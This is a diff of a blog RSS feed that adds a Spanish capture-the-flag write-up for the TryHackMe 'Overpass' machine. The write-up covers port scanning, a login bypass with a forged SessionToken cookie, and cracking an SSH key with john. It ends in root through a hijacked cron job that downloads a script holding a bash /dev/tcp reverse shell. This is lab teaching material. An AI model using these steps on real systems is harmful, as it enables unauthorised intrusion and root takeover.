@@ -6,7 +6,239 @@
         <description>Recent content on d3b0o</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sat, 31 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://d3b0o.github.io/post/writeups/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 07 Jan 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://d3b0o.github.io/post/writeups/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Resolución Overpass</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-overpass/</link>
+        <pubDate>Sat, 07 Jan 2023 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-overpass/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-overpass/images/portada.png" alt="Featured image of post Resolución Overpass" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/overpass&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://tryhackme.com/room/overpass&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP Víctima = 10.10.170.40&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ ping -c 1 10.10.170.40
+PING 10.10.170.40 (10.10.170.40) 56(84) bytes of data.
+64 bytes from 10.10.170.40: icmp_seq=1 ttl=63 time=218 ms
+
+--- 10.10.170.40 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 217.508/217.508/217.508/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.170.40 -oG allPorts
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPort&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.170.40
+   5   │     [*] Open ports: 22,80
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ nmap -p 22,80 -sC -sV 10.10.170.40
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-07 20:15 CET
+Nmap scan report for 10.10.170.40
+Host is up (0.052s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 37968598d1009c1463d9b03475b1f957 (RSA)
+|   256 5375fac065daddb1e8dd40b8f6823924 (ECDSA)
+|_  256 1c4ada1f36546da6c61700272e67759c (ED25519)
+80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Overpass
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;web&#34;&gt;Web&lt;/h3&gt;
+&lt;p&gt;Con el whatweb podemos ver más información sobre la web:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ whatweb 10.10.170.40
+http://10.10.170.40 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.170.40], Script, Title[Overpass], X-UA-Compatible[IE=edge]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Al entrar a la web con lo primero que nos encontramos es esta página&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-overpass/images/web.png&#34;
+	width=&#34;1891&#34;
+	height=&#34;605&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;312&#34;
+		data-flex-basis=&#34;750px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h4 id=&#34;buscando-subdirectorios&#34;&gt;Buscando Subdirectorios&lt;/h4&gt;
+&lt;p&gt;Con wfuzz vamos a buscar subdirectorios mediante el diccionario &lt;code&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                     
+=====================================================================
+
+000000069:   301        0 L      0 W        0 Ch        &amp;quot;downloads&amp;quot;                                                                                                                 
+000000039:   301        0 L      0 W        0 Ch        &amp;quot;img&amp;quot;                                                                                                                       
+000000156:   301        0 L      0 W        0 Ch        &amp;quot;aboutus&amp;quot;                                                                                                                   
+000000259:   301        2 L      3 W        42 Ch       &amp;quot;admin&amp;quot;                                                                                                                     
+000000550:   301        0 L      0 W        0 Ch        &amp;quot;css&amp;quot; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;infiltración&#34;&gt;Infiltración&lt;/h2&gt;
+&lt;p&gt;Dentro del /admin hay un panel de login. Viendo el codigó del /admin se puede ver que hay un login.js&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;script src=&amp;quot;/login.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;El cual contiene lo siguiente:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;async function postData(url = &#39;&#39;, data = {}) {
+    // Default options are marked with *
+    const response = await fetch(url, {
+        method: &#39;POST&#39;, // *GET, POST, PUT, DELETE, etc.
+        cache: &#39;no-cache&#39;, // *default, no-cache, reload, force-cache, only-if-cached
+        credentials: &#39;same-origin&#39;, // include, *same-origin, omit
+        headers: {
+            &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;
+        },
+        redirect: &#39;follow&#39;, // manual, *follow, error
+        referrerPolicy: &#39;no-referrer&#39;, // no-referrer, *client
+        body: encodeFormData(data) // body data type must match &amp;quot;Content-Type&amp;quot; header
+    });
+    return response; // We don&#39;t always want JSON back
+}
+const encodeFormData = (data) =&amp;gt; {
+    return Object.keys(data)
+        .map(key =&amp;gt; encodeURIComponent(key) + &#39;=&#39; + encodeURIComponent(data[key]))
+        .join(&#39;&amp;amp;&#39;);
+}
+function onLoad() {
+    document.querySelector(&amp;quot;#loginForm&amp;quot;).addEventListener(&amp;quot;submit&amp;quot;, function (event) {
+        //on pressing enter
+        event.preventDefault()
+        login()
+    });
+}
+async function login() {
+    const usernameBox = document.querySelector(&amp;quot;#username&amp;quot;);
+    const passwordBox = document.querySelector(&amp;quot;#password&amp;quot;);
+    const loginStatus = document.querySelector(&amp;quot;#loginStatus&amp;quot;);
+    loginStatus.textContent = &amp;quot;&amp;quot;
+    const creds = { username: usernameBox.value, password: passwordBox.value }
+    const response = await postData(&amp;quot;/api/login&amp;quot;, creds)
+    const statusOrCookie = await response.text()
+    if (statusOrCookie === &amp;quot;Incorrect credentials&amp;quot;) {
+        loginStatus.textContent = &amp;quot;Incorrect Credentials&amp;quot;
+        passwordBox.value=&amp;quot;&amp;quot;
+    } else {
+        Cookies.set(&amp;quot;SessionToken&amp;quot;,statusOrCookie)
+        window.location = &amp;quot;/admin&amp;quot;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Lo que hace es: Se verifica la respuesta del servidor para comprobar si contiene la cadena &amp;ldquo;Incorrect credentials&amp;rdquo; (credenciales incorrectas), y si no se recibe, el script establece una cookie llamada &amp;ldquo;SessionToken&amp;rdquo; con el valor de la respuesta del servidor y redirige al usuario a la página &amp;ldquo;/admin&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;Entonces lo que podemos hacer es crear una cookie con el nombre &amp;ldquo;SessionToken&amp;rdquo; y el value random. Al recargar ya podemos entrar&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-overpass/images/cookie2.png&#34;
+	width=&#34;898&#34;
+	height=&#34;407&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;220&#34;
+		data-flex-basis=&#34;529px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Lo que vemos al recargar la página, es una RSA private key.&lt;/p&gt;
+&lt;p&gt;Esa private key la vamos a guardar en un archivo llamado &lt;strong&gt;id_rsa&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Primero le damos los permisos:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;chmod 600 id_rsa
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En la rsa private key vemos que pone que està encriptada.&lt;/p&gt;
+&lt;p&gt;Para conesguir la contraseña vamos a sacar el hash con ssh2john y después con john mediante un diccionario vamos a probar de crackearlo&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ssh2john id_rsa &amp;gt; hash.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ya tenemos la contraseña&lt;/p&gt;
+&lt;p&gt;Ahora nos conectamos por ssh como james con la id_rsa&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ssh -i id_rsa james@10.10.45.54
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;escalada-de-privilegios&#34;&gt;Escalada de privilegios&lt;/h2&gt;
+&lt;p&gt;Con un &lt;code&gt;cat /etc/crontab&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Vemos que hace como root un curl a &lt;strong&gt;overpass.thm/downloads/src/buildscript.sh&lt;/strong&gt; y después lo ejecuta con bash.&lt;/p&gt;
+&lt;p&gt;Tenemos permisos para editar el &lt;strong&gt;/etc/hosts&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Añadimos lo siguiente en el /etc/hosts&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;10.10.10.10 overpass.thm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Después desde nuestra máquina creamos las carpetas y el archivo que salen en la url del crontab&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ cat downloads/src/buildscript.sh
+───────┬─────────────────────────────────────────────────────────────────────────────────────────
+       │ File: downloads/src/buildscript.sh
+───────┼─────────────────────────────────────────────────────────────────────────────────────────
+   1   │ #!/bin/bash
+   2   │ 
+   3   │ bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/443 0&amp;gt;&amp;amp;1&amp;quot;
+───────┴─────────────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Nos abrimos un servidor con python&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo python3 -m http.server 80
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Y por último nos ponemos en escucha por el puerto 443 con netcat&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nc -nlvp 443
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Nos esperamos un rato y ya somos root&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Resolución Develpy</title>
         <link>https://d3b0o.github.io/p/resoluci%C3%B3n-develpy/</link>
         <pubDate>Sat, 31 Dec 2022 00:00:00 +0000</pubDate>
